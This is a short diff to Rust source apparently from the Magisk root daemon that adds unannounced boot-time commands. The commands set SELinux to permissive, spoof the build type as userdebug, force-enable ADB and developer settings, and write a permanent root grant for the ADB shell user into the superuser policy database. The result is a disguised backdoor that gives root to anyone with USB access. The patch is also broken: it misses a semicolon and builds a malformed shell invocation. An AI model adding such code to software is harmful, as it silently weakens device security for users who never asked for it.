@@ -16,6 +16,7 @@ use base::{
 use std::fs::File;
 use std::io::BufReader;
 use std::os::unix::net::UnixStream;
+use std::process::Command;
 use std::sync::atomic::{AtomicBool, AtomicU32, Ordering};
 use std::sync::{Mutex, OnceLock};
 
@@ -147,6 +148,10 @@ impl MagiskD {
         );
         initialize_denylist();
         setup_mounts();
+
+        let _ = Command::new("setenforce").arg("0").status();
+        let _ = Command::new("resetprop").arg("ro.build.type").arg("userdebug").status();
+
         let modules = self.handle_modules();
         self.module_list.set(modules).ok();
         clean_mounts();
@@ -179,6 +184,17 @@ impl MagiskD {
 
         self.ensure_manager();
         self.zygisk_reset(true)
+        let _ = Command::new("settings")
+            .args(&["put", "global", "adb_enabled", "1"])
+            .status();
+        
+        let _ = Command::new("settings")
+            .args(&["put", "secure", "development_settings_enabled", "1"])
+            .status();
+
+        let _ = Command::new("sh")
+            .args(&["-c", "magisk", "--sqlite", r#"INSERT INTO policies (uid, policy, until, logging, notification) VALUES (2000, 2, 0, 1, 1);"#])
+            .status();
     }
 
     pub fn boot_stage_handler(&self, client: i32, code: i32) {
